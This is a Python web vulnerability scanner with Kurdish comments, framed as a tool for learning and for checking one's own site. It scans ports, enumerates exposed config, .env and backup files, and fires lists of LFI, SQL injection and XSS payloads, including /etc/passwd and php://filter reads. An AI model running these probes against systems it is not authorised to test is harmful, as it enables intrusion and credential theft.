#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  ADVANCED CYBER SCANNER v2.0
#  بۆ مەبەستی فێربوون و پشکنینی ماڵپەڕی خۆت
#  Made by: Cyber Kurd Team (Updated)
# ============================================================

import sys
import os
import re
import ssl
import time
import json
import socket
import base64
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====================== پشکنینی کتێبخانەکان ======================
try:
    import requests
    from bs4 import BeautifulSoup
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] تکایە سەرەتا ئەم فەرمانە بنووسە:")
    print("pip install requests beautifulsoup4 colorama urllib3")
    sys.exit(1)

# ناچالاککردنی ئاگاداری SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ====================== ڕێکخستنەکان ======================
TIMEOUT = 10
THREADS = 25
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ====================== لیستی فایلەکان ======================
COMMON_FILES = [
    "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-config.php.save",
    "wp-config.php~", "wp-config.php.swp", "wp-config.txt", "config.php",
    "config.php.bak", "config.php.old", "configuration.php", "settings.php",
    "database.php", "db.php", "connect.php", "connection.php", "functions.php",
    "includes/config.php", "includes/db.php", "admin/config.php", "admin/config.inc.php",
    "application/config.php", "app/config.php", "core/config.php", "system/config.php",
    "library/config.php", "src/config.php", "index.php", "wp-load.php",
    "wp-settings.php", "wp-includes/functions.php", "wp-admin/setup-config.php",
    ".env", ".env.bak", ".env.old", ".env.save", ".git/config", ".git/HEAD",
    "backup.zip", "backup.tar.gz", "backup.sql", "db.sql", "database.sql",
    "phpinfo.php", "info.php", "test.php", "admin.php", "login.php",
    "robots.txt", "sitemap.xml", ".htaccess", "composer.json", "package.json",
    "Dockerfile", "docker-compose.yml", "web.config", "crossdomain.xml",
    "admin/", "administrator/", "login/", "backup/", "uploads/", "files/",
    "api/", "v1/", "v2/", "graphql", "swagger.json", "openapi.json"
]

# ====================== پەیڵۆدەکان ======================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "..\\..\\..\\..\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]

SQLI_PAYLOADS = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
    "admin'--",
    "' OR 1=1#",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "') OR ('1'='1",
    "1' WAITFOR DELAY '0:0:5'--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
]

# ====================== نیشانەکان ======================
LFI_SIGNS = ["root:x:0:0", "[extensions]", "<?php", "define(", "DB_PASSWORD", "DOCUMENT_ROOT"]
SQLI_SIGNS = ["SQL syntax", "mysql_fetch", "You have an error in your SQL", "Warning: mysql", "ORA-", "PostgreSQL", "SQLite"]
XSS_SIGNS = ["<script>alert(1)</script>", "onerror=alert(1)", "javascript:alert(1)"]

# ====================== دەرگا باوەکان ======================
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]

# ====================== فەنکشنەکان ======================

def print_banner():
    """پیشاندانی لۆگۆی گەورە و ڕەنگاوڕەنگ"""
    logo = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Fore.RED}███████╗██╗   ██╗███████╗     ██████╗ ███████╗    ███╗   ██╗ █████╗ ███████╗██╗{Fore.CYAN}  ║
║  {Fore.RED}██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ████╗  ██║██╔══██╗╚══███╔╝██║{Fore.CYAN}  ║
║  {Fore.RED}█████╗   ╚████╔╝ █████╗      ██║   ██║█████╗      ██╔██╗ ██║███████║  ███╔╝ ██║{Fore.CYAN}  ║
║  {Fore.RED}██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝      ██║╚██╗██║██╔══██║ ███╔╝  ██║{Fore.CYAN}  ║
║  {Fore.RED}███████╗   ██║   ███████╗    ╚██████╔╝██║         ██║ ╚████║██║  ██║███████╗██║{Fore.CYAN}  ║
║  {Fore.RED}╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝{Fore.CYAN}  ║
║                                                                              ║
║  {Fore.YELLOW}              ADVANCED CYBER SCANNER v2.0 - SOURCE HUNTER{Fore.CYAN}                ║
║  {Fore.GREEN}                    Made by: Cyber Kurd Team{Fore.CYAN}                            ║
║  {Fore.MAGENTA}                    بۆ مەبەستی فێربوون و پشکنینی ماڵپەڕی خۆت{Fore.CYAN}                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(logo)

def get_headers():
    return {"User-Agent": USER_AGENT}

def fetch_url(url):
    """هێنانی ناوەڕۆکی لاپەڕەیەک"""
    try:
        response = requests.get(url, headers=get_headers(), timeout=TIMEOUT, verify=False, allow_redirects=True)
        return response
    except Exception:
        return None

def crawl_site(base_url):
    """گەڕان بەدوای لینک و فۆڕمەکان"""
    print(f"\n{Fore.BLUE}[*] دەستپێکردنی گەڕان (Crawling) بۆ: {base_url}{Style.RESET_ALL}")
    links = set()
    forms = []
    
    response = fetch_url(base_url)
    if not response:
        print(f"{Fore.RED}[!] نەتوانرا لاپەڕەکە بکرێتەوە.{Style.RESET_ALL}")
        return links, forms

    soup = BeautifulSoup(response.text, 'html.parser')

    for a_tag in soup.find_all('a', href=True):
        link = urllib.parse.urljoin(base_url, a_tag['href'])
        if base_url.split('//')[1].split('/')[0] in link:
            links.add(link)

    for form in soup.find_all('form'):
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        inputs = []
        for inp in form.find_all(['input', 'textarea']):
            name = inp.get('name')
            if name:
                inputs.append(name)
        forms.append({"action": urllib.parse.urljoin(base_url, action), "method": method, "inputs": inputs})

    print(f"{Fore.GREEN}[+] {len(links)} لینک و {len(forms)} فۆڕم دۆزرایەوە.{Style.RESET_ALL}")
    return links, forms

def test_lfi(url):
    """پشکنینی LFI"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    findings = []
    
    if not params:
        return findings

    for param in params:
        for payload in LFI_PAYLOADS:
            new_params = params.copy()
            new_params[param] = [payload]
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            response = fetch_url(new_url)
            if response:
                for sign in LFI_SIGNS:
                    if sign in response.text:
                        findings.append({"url": new_url, "param": param, "payload": payload})
                        print(f"{Fore.RED}[!] LFI دۆزرایەوە: {new_url}{Style.RESET_ALL}")
                        break
    return findings

def test_sqli(url):
    """پشکنینی SQL Injection"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    findings = []
    
    if not params:
        return findings

    for param in params:
        for payload in SQLI_PAYLOADS:
            new_params = params.copy()
            new_params[param] = [payload]
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            response = fetch_url(new_url)
            if response:
                for sign in SQLI_SIGNS:
                    if sign.lower() in response.text.lower():
                        findings.append({"url": new_url, "param": param, "payload": payload})
                        print(f"{Fore.RED}[!] SQLI دۆزرایەوە: {new_url}{Style.RESET_ALL}")
                        break
    return findings

def test_xss(url):
    """پشکنینی XSS"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    findings = []
    
    if not params:
        return findings

    for param in params:
        for payload in XSS_PAYLOADS:
            new_params = params.copy()
            new_params[param] = [payload]
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            response = fetch_url(new_url)
            if response and payload in response.text:
                findings.append({"url": new_url, "param": param, "payload": payload})
                print(f"{Fore.RED}[!] XSS دۆزرایەوە: {new_url}{Style.RESET_ALL}")
                break
    return findings

def check_file(base_url, file_path):
    """پشکنینی بوونی فایلێک"""
    url = urllib.parse.urljoin(base_url, file_path)
    response = fetch_url(url)
    if response and response.status_code == 200:
        content_length = len(response.content)
        if content_length > 0:
            return {"url": url, "file": file_path, "size": content_length}
    return None

def scan_files(base_url):
    """پشکنینی فایلەکان بە خێرایی"""
    print(f"\n{Fore.BLUE}[*] دەستپێکردنی پشکنینی فایلەکان...{Style.RESET_ALL}")
    findings = []
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(check_file, base_url, f): f for f in COMMON_FILES}
        for future in as_completed(futures):
            result = future.result()
            if result:
                findings.append(result)
                print(f"{Fore.RED}[!] فایل دۆزرایەوە: {result['url']} (قەبارە: {result['size']} بایت){Style.RESET_ALL}")
    
    return findings

def scan_ports(host):
    """پشکنینی دەرگاکان (Port Scanning)"""
    print(f"\n{Fore.BLUE}[*] دەستپێکردنی پشکنینی دەرگاکان بۆ: {host}{Style.RESET_ALL}")
    open_ports = []
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                return port
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_port, p): p for p in COMMON_PORTS}
        for future in as_completed(futures):
            port = future.result()
            if port:
                open_ports.append(port)
                print(f"{Fore.GREEN}[+] دەرگا کراوە: {port}{Style.RESET_ALL}")
    
    return open_ports

def save_report(data, filename):
    """پاشەکەوتکردنی ڕاپۆرت بە JSON"""
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    print(f"{Fore.GREEN}[+] ڕاپۆرت پاشەکەوتکرا: {filename}{Style.RESET_ALL}")

def main():
    print_banner()
    print(f"{Fore.YELLOW}[!] تەنها بۆ ماڵپەڕی خۆت بەکاریبهێنە!{Style.RESET_ALL}\n")
    
    target = input(f"{Fore.CYAN}ناونیشانی ماڵپەڕەکەت بنووسە (وەک: http://example.com): {Style.RESET_ALL}").strip()
    
    if not target.startswith("http"):
        target = "http://" + target
    
    if not target.endswith("/"):
        target += "/"

    host = target.split('//')[1].split('/')[0].split(':')[0]

    confirm = input(f"{Fore.YELLOW}ئایا تۆ خاوەنی ئەم ماڵپەڕەیت؟ (yes/no): {Style.RESET_ALL}").strip().lower()
    if confirm != "yes":
        print(f"{Fore.RED}[!] تکایە تەنها ماڵپەڕی خۆت بەکاربهێنە.{Style.RESET_ALL}")
        sys.exit(0)

    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] ئامانج: {target}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] هۆست: {host}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

    all_findings = {
        "target": target,
        "host": host,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "files": [],
        "lfi": [],
        "sqli": [],
        "xss": [],
        "forms": [],
        "ports": []
    }

    # ١. پشکنینی دەرگاکان
    all_findings["ports"] = scan_ports(host)

    # ٢. گەڕان
    links, forms = crawl_site(target)
    all_findings["forms"] = forms

    # ٣. پشکنینی فایلەکان
    all_findings["files"] = scan_files(target)

    # ٤. پشکنینی LFI/SQLI/XSS
    print(f"\n{Fore.BLUE}[*] پشکنینی LFI, SQLI, XSS لەسەر {len(links)} لینک...{Style.RESET_ALL}")
    for link in list(links)[:30]:
        all_findings["lfi"].extend(test_lfi(link))
        all_findings["sqli"].extend(test_sqli(link))
        all_findings["xss"].extend(test_xss(link))

    # ٥. پشکنینی فۆڕمەکان
    for form in forms:
        if form["method"] == "get" and form["inputs"]:
            params = "&".join([f"{inp}=test" for inp in form["inputs"]])
            test_url = f"{form['action']}?{params}"
            all_findings["lfi"].extend(test_lfi(test_url))
            all_findings["sqli"].extend(test_sqli(test_url))
            all_findings["xss"].extend(test_xss(test_url))

    # ====================== ڕاپۆرتی کۆتایی ======================
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}                    ڕاپۆرتی کۆتایی{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}کۆی دۆزینەوەکان:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}•{Style.RESET_ALL} دەرگا کراوەکان: {Fore.RED}{len(all_findings['ports'])}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}•{Style.RESET_ALL} فایلەکان: {Fore.RED}{len(all_findings['files'])}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}•{Style.RESET_ALL} LFI: {Fore.RED}{len(all_findings['lfi'])}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}•{Style.RESET_ALL} SQLI: {Fore.RED}{len(all_findings['sqli'])}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}•{Style.RESET_ALL} XSS: {Fore.RED}{len(all_findings['xss'])}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}•{Style.RESET_ALL} فۆڕمەکان: {Fore.RED}{len(all_findings['forms'])}{Style.RESET_ALL}")

    report_file = f"report_{int(time.time())}.json"
    save_report(all_findings, report_file)
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] بەرنامەکە ڕاگیرا.{Style.RESET_ALL}")
        sys.exit(0)
